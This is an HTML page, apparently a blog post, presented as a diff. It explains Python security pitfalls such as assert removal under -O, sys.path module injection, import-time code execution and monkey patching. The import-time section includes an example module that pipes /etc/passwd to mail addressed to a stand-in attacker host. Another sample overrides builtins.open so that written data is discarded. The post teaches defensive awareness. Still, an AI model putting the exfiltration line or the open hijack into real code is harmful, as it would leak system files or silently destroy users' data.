@@ -1,0 +1,348 @@
+<!doctype html>
+<html>
+<head>
+    <base href="/">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta name="author" content="Ronald Zhao">
+
+<meta name="description" content="">
+
+<title>不可不知的Python陷阱</title>
+<meta name="generator" content="Hugo 0.55.4" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.1.0/styles/pojoaque.min.css">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.1.0/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+
+<link href="https://fonts.googleapis.com/css?family=Source+Code+Pro:400,700" rel="stylesheet" type="text/css">
+<link  href="https://ronaldzhao.top//css/theme.min.css" rel="stylesheet" type="text/css">
+
+</head>
+<body>
+<div class="page-container container-fluid">
+<div class="col-md-3 menu">
+    <nav class="col-md-3">
+    
+    <h3 class="home-link"><a href="/">Root</a></h3>
+    <div id="last-posts" class="open">
+        <h3 data-open="last-posts">Ronald Zhao&#39;s Blog - Most recent posts</h3>
+        <ul>
+            
+            <li><a href="https://ronaldzhao.top/posts/win10%E5%85%A8%E5%B1%80%E9%85%8D%E7%BD%AEpypi%E6%BA%90/">Win10全局配置pypi源</a></li>
+            
+            <li><a href="https://ronaldzhao.top/posts/%E5%B0%86hugo%E5%8D%9A%E5%AE%A2%E9%83%A8%E7%BD%B2%E5%88%B0github/">将Hugo博客部署到Github</a></li>
+            
+            <li><a href="https://ronaldzhao.top/posts/functools.wraps%E8%A3%85%E9%A5%B0%E5%99%A8%E7%9A%84%E4%BD%9C%E7%94%A8/">functools.wraps装饰器的作用</a></li>
+            
+            <li><a href="https://ronaldzhao.top/posts/python%E5%8F%98%E9%87%8F%E7%9A%84%E4%BD%9C%E7%94%A8%E5%9F%9F/">Python变量的作用域</a></li>
+            
+            <li><a href="https://ronaldzhao.top/posts/python%E9%9D%A2%E8%AF%95%E9%A2%98%E6%94%B6%E9%9B%86%E6%95%B4%E7%90%86/">Python面试题收集整理</a></li>
+            
+            <li><a href="https://ronaldzhao.top/posts/win10%E5%AE%89%E8%A3%85chocolatey%E5%92%8Cvim/">Win10安装Chocolatey和Vim</a></li>
+            
+            <li><a href="https://ronaldzhao.top/posts/win10%E4%B8%8B%E5%AE%89%E8%A3%85mysql8.0.11.zip/">Win10下安装MySQL8.0.11</a></li>
+            
+            <li><a href="https://ronaldzhao.top/about/">About Me</a></li>
+            
+            <li><a href="https://ronaldzhao.top/posts/yield_from/">yield from</a></li>
+            
+            <li><a href="https://ronaldzhao.top/posts/yield%E5%92%8Cgenerator/">yield和generator</a></li>
+            
+        </ul>
+    </div>
+    
+
+    
+    <div id="tags" class="open">
+        <h3 data-open="tags">Tags</h3>
+        <ul class="tags">
+            
+            <li><a href="/tags/generator">generator</a></li>
+            
+            <li><a href="/tags/hugo">hugo</a></li>
+            
+            <li><a href="/tags/mysql">mysql</a></li>
+            
+            <li><a href="/tags/python">python</a></li>
+            
+            <li><a href="/tags/vim">vim</a></li>
+            
+            <li><a href="/tags/vs-code">vs-code</a></li>
+            
+            <li><a href="/tags/yield">yield</a></li>
+            
+        </ul>
+    </div>
+    
+
+    
+    <div id="categories" class="open">
+        <h3 data-open="categories">Categories</h3>
+        <ul class="categories">
+            
+            <li><a href="/categories/golang">golang</a></li>
+            
+            <li><a href="/categories/python">python</a></li>
+            
+            <li><a href="/categories/%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83">开发环境</a></li>
+            
+            <li><a href="/categories/%E6%95%B0%E6%8D%AE%E5%BA%93">数据库</a></li>
+            
+            <li><a href="/categories/%E9%9D%A2%E8%AF%95%E9%A2%98">面试题</a></li>
+            
+        </ul>
+    </div>
+    
+</nav>
+
+</div>
+<div class="col-md-9 content">
+
+<h1>不可不知的Python陷阱</h1>
+<h4>Published 04-20-2019 22:34:22</h4>
+
+<a href="https://twitter.com/share" class="twitter-share-button" data-via="kendo5731"></a>
+<script>!function (d, s, id) {
+    var js, fjs = d.getElementsByTagName(s)[0], p = /^http:/.test(d.location) ? 'http' : 'https';
+    if (!d.getElementById(id)) {
+        js = d.createElement(s);
+        js.id = id;
+        js.src = p + '://platform.twitter.com/widgets.js';
+        fjs.parentNode.insertBefore(js, fjs);
+    }
+}(document, 'script', 'twitter-wjs');</script>
+
+<div class="fb-share-button" data-href="https://ronaldzhao.top/posts/%E4%B8%8D%E5%8F%AF%E4%B8%8D%E7%9F%A5%E7%9A%84python%E9%99%B7%E9%98%B1/" data-layout="button"></div>
+<div id="fb-root"></div>
+<script>(function(d, s, id) {
+    var js, fjs = d.getElementsByTagName(s)[0];
+    if (d.getElementById(id)) return;
+    js = d.createElement(s); js.id = id;
+    js.src = "//connect.facebook.net/en-US/sdk.js#xfbml=1&version=v2.5";
+    fjs.parentNode.insertBefore(js, fjs);
+}(document, 'script', 'facebook-jssdk'));</script>
+
+<article>
+    
+
+<blockquote>
+<p>注意: 以下内容全部基于<code>python3</code></p>
+</blockquote>
+
+<h2 id="断言语句">断言语句</h2>
+
+<p>在python应用中使用<code>assert</code>语句来捕获不可能的条件是一个编程习惯：</p>
+
+<pre><code class="language-python">def verify_credentials(username, password):
+    assert username and password, 'Credentials not supplied by caller'
+    
+    ... authenticate possibly null user with null password ...
+</code></pre>
+
+<p>然而，当将源码编译成优化的字节码后(例如<code>python -O</code>)，python并不会为<code>assert</code>语句生成任何指令，编译器会默默地删除那些程序员写的让程序免受畸形数据攻击的代码，让应用暴露在攻击中。</p>
+
+<p>该漏洞的根本原因在于<code>assert机制</code>纯粹是为了测试的目的而设计的，正如在C++中的那样。所以程序员必须使用其他手段以保证数据的一致性。</p>
+
+<h2 id="可重用整数">可重用整数</h2>
+
+<p>python中万物皆对象。每个对象都有一个唯一的标识符，可以使用<code>id()</code>函数来获取。要找出两个变量或两个属性是否都指向同一个对象，可以使用<code>is</code>操作符。整数也是对象，因此<code>is</code>操作符确实是为他们定义的：</p>
+
+<pre><code class="language-bash">&gt;&gt;&gt; 999+1 is 1000
+False
+</code></pre>
+
+<p>如果上面的结果看起来令人诧异，那么记住，<code>is</code>操作符是在两个对象的标识符上工作的——它并不比较它们的数值或其他值。然而：</p>
+
+<pre><code class="language-bash">&gt;&gt;&gt; 1+1 is 2
+True
+</code></pre>
+
+<p>很奇怪对不对？对该行为的解释是：python维护了一个对象连接池，其中保有前几百个整数(小整数)，重用它们会内存和对象的创建。更让人凌乱的是，&rdquo;小整数&rdquo;的定义在不同的python版本中并不相同。</p>
+
+<p>这里的应对措施是：绝对不要把<code>is</code>操作符用于值的比较上。<code>is</code>操作符是设计用来处理唯一对象标识符的。</p>
+
+<h2 id="浮点数比较">浮点数比较</h2>
+
+<p>由于固定且有限的精度，以及十进制与二进制小数表示所产生的差异，使用浮点数可能很复杂。混乱的一个常见原因是，浮点数比较有时可能会产生意想不到的结果，例如：</p>
+
+<pre><code class="language-bash">&gt;&gt;&gt; 2.2 * 3.0 == 3.3 * 2.0
+False
+</code></pre>
+
+<p>上面结果的原因实际上是舍入错误：</p>
+
+<pre><code class="language-bash">&gt;&gt;&gt; (2.2 * 3.0).hex()
+'0x1.a666666666667p+2'
+&gt;&gt;&gt; (3.3*2.0).hex()
+'0x1.a666666666666p+2'
+</code></pre>
+
+<p>一般来说，当重要的决定是基于算术运算的结果做出的，就必须要小心不要成为舍入错误的牺牲品。参见python文档中的<a href="https://docs.python.org/3/tutorial/floatingpoint.html">Floating Point Arithmetic: Issues and Limitations</a>章节。</p>
+
+<h2 id="私有属性">私有属性</h2>
+
+<p>python不支持对象属性隐藏。但有一个基于<a href="https://docs.python.org/3/tutorial/classes.html#tut-private">双下划线属性重整</a>特性的解决方案。虽然属性名的修改<a href="https://docs.python.org/3/reference/expressions.html#atom-identifiers">只发生在代码上</a>，但是硬编码到字符串常量的属性名保持不变。当一个双下划线的属性明显从<code>getattr()</code>/<code>setattr()</code>函数隐藏，这可能会导致混乱的行为。</p>
+
+<pre><code class="language-bash">&gt;&gt;&gt; classX(object):
+        def __init__(self):
+            self.__private = 1
+        def get_private(self):
+            return self.__private
+        def has_private(self):
+            return hasattr(self, '__private')
+&gt;&gt;&gt; x = X()
+&gt;&gt;&gt; x.has_private()
+False
+&gt;&gt;&gt; x.get_private()
+1
+</code></pre>
+
+<p>要让这个私有特性能用，类定义之外的属性并不执行属性重整(attribute mangling)。基于被引用的地方，它有效地将任意给定的双下划线属性&rdquo;分裂&rdquo;成两类。</p>
+
+<pre><code class="language-bash">&gt;&gt;&gt; class X(object):
+        def __init__(self):
+            self.__private = 1
+&gt;&gt;&gt; x = X()
+&gt;&gt;&gt; x.__private
+Traceback (most recent call last):
+  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;
+AttributeError: 'X' object has no attribute '__private'
+&gt;&gt;&gt; x.__private = 2
+&gt;&gt;&gt; x.__private
+2
+&gt;&gt;&gt; hasattr(x, &quot;__private&quot;)
+True
+</code></pre>
+
+<p>如果程序员依赖于双下划线属性来在他们的代码中做出重要决定，而不关注私有属性的不对称行为，那么这些小技巧会变成安全漏洞。</p>
+
+<h2 id="模块注入">模块注入</h2>
+
+<p>python的模块导入系统功能强大而复杂。模块和包可以通过定义在<a href="https://docs.python.org/3/library/sys.html#sys.path">sys.path</a>列表中的搜索路径找到的文件名或目录名导入。搜索路径初始化是一个复杂的过程，它也依赖于python版本、平台和本地配置。要对一个python应用程序进行成功攻击，攻击者需要找到一种方法来将恶意python模块揉入进python在尝试导入模块时会考虑的一个目录或可导入包文件。</p>
+
+<p>处理措施是维护搜索路径中的所有目录和包文件的安全访问权限，以确保未经授权的用户无法对其进行写访问。请记住，调用python解释器的初始脚本所在的目录会自动插入到搜索路径中。</p>
+
+<p>运行像这样的脚本来显示实际的搜索路径：</p>
+
+<pre><code class="language-bash">$ cat myapp.py
+#!/usr/bin/python3
+import sys
+import pprint
+
+pprint.pprint(sys.path)
+</code></pre>
+
+<p>在Windows平台，python进程的当前工作目录，而不是脚本所在位置，会被<a href="https://docs.python.org/3/using/windows.html#finding-modules">注入</a>到搜索路径中。在UNIX平台，无论何时从标准输入或者命令行(&ldquo;-&ldquo;或者&rdquo;-c&rdquo;或者&rdquo;-m&rdquo;参数)读入程序代码，当前工作目录都会被自动插入到<code>sys.path</code>中：</p>
+
+<pre><code class="language-bash">$ echo &quot;import sys, pprint; pprint.pprint(sys.path)&quot; | python -
+       ['',
+        '/usr/lib/python3.3/site-packages/pip-7.1.2-py3.3.egg',
+        '/usr/lib/python3.3/site-packages/setuptools-20.1.1-py3.3.egg',
+        ...]
+       $ python -c 'import sys, pprint; pprint.pprint(sys.path)'
+       ['',
+        '/usr/lib/python3.3/site-packages/pip-7.1.2-py3.3.egg',
+        '/usr/lib/python3.3/site-packages/setuptools-20.1.1-py3.3.egg',
+        ...]
+       $
+       $ cd /tmp
+       $ python -m myapp
+       ['',
+        '/usr/lib/python3.3/site-packages/pip-7.1.2-py3.3.egg',
+        '/usr/lib/python3.3/site-packages/setuptools-20.1.1-py3.3.egg',
+        ...]
+</code></pre>
+
+<p>要处理从当前工作路径注入模块的风险，推荐在Windows运行python或者通过命令行传递代码之前，显式地修改目录到一个安全的目录。</p>
+
+<p>另一个搜索路径可能的来源是<code>$PYTHONPATH</code>环境变量的内容。抵御<code>sys.path</code>不被进程环境污染的简单办法是传递<code>-E</code>选项给python解释器，这会让它忽略<code>$PYTHONPATH</code>变量。</p>
+
+<h2 id="导入时的代码执行">导入时的代码执行</h2>
+
+<p><code>import</code>语句实际上会导入被导入模块中的代码的执行，这一事实并不明显。这就是为什么甚至导入不可信模块或包是有风险的。导入像这样的简单模块可能会导致不愉快的结果：</p>
+
+<pre><code class="language-bash">$ cat malicious.py
+import os
+import sys
+
+os.system('cat /etc/passwd | mail attacker@blackhat.com')
+
+del sys.modules['malicious']  # 假装它没有被导入
+$ python
+&gt;&gt;&gt; import malicoius
+&gt;&gt;&gt; dir(malicious)
+Traceback (most recent call last):
+       NameError: name 'malicious' is not defined
+</code></pre>
+
+<p>与<code>sys.path</code>入口注入攻击相结合，它可能为进一步的系统漏洞利用铺平道路。</p>
+
+<h2 id="猴子补丁-monkey-patching">猴子补丁(monkey patching)</h2>
+
+<p>运行时修改python对象属性的过程称之为猴子补丁(monkey patching)。作为动态语言，python完全支持运行时程序自省和代码突变。一旦以某种方式导入了一个恶意模块，那么任何现有的可变对象可被不知不觉地在没有程序员同意的情况下被打猴子补丁。考虑以下情况：</p>
+
+<pre><code class="language-bash">$ cat nowrite.py
+import builtins
+
+def malicious_open(*args, **kwargs):
+    if len(args) &gt; 1 and args[1] == 'w':
+        args = ('/dev/null',) + args[1:]
+    return original_open(*args, **kwargs)
+
+original_open(), builtins.open = builtins.open, malicious_open
+</code></pre>
+
+<p>如果python解释器执行了上面的代码，那么任何写到文件的东西都不会存储到文件系统中：</p>
+
+<pre><code class="language-bash">&gt;&gt;&gt; import nowrite
+&gt;&gt;&gt; f = open('data.txt', 'w')
+&gt;&gt;&gt; f.write('data to store')
+&gt;&gt;&gt; f.close()
+&gt;&gt;&gt; f = open('data.txt')
+raceback (most recent call last):
+  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;
+  File &quot;/Users/username/nowrite.py&quot;, line 6, in malicious_open
+    return original_open(*args, **kwargs)
+FileNotFoundError: [Errno 2] No such file or directory: 'data.txt'
+</code></pre>
+
+<p>攻击者可以利用python垃圾回收器(<code>gc.get_objects()</code>)来掌握现有的所有对象，并黑进它们中任意一个。</p>
+
+<p>python对象的类型是由<code>__class__</code>属性决定的。邪恶的攻击者可以通过依靠改变活动对象的类型来令人绝望的把事情搞砸：</p>
+
+<pre><code class="language-bash">&gt;&gt;&gt; class X(object): pass
+... 
+&gt;&gt;&gt; class Y(object): pass
+... 
+&gt;&gt;&gt; x_obj = X()
+&gt;&gt;&gt; x_obj
+&lt;__main__.X object at 0x7f62dbe5e010&gt;
+&gt;&gt;&gt; isinstance(x_obj, X)
+True
+&gt;&gt;&gt; x_obj.__class__ = Y
+&gt;&gt;&gt; x_obj
+&lt;__main__.Y object at 0x7f62dbe5d350&gt;
+&gt;&gt;&gt; isinstance(x_obj, X)
+False
+&gt;&gt;&gt; isinstance(x_obj, Y)
+True
+</code></pre>
+
+<p>对抗恶意猴子补丁的唯一处理措施是保证导入的python模块的真实性和完整性</p>
+
+<h2 id="笔记整理来源">笔记整理来源</h2>
+
+<p><a href="https://juejin.im/entry/58fc232ca22b9d00659dab89">不可不知的一点 Python 陷阱</a></p>
+
+</article>
+
+
+
+</div>
+</div>
+<script src="https://ronaldzhao.top//js/theme.min.js" type="text/javascript"></script>
+
+
+</body>
+</html>
+
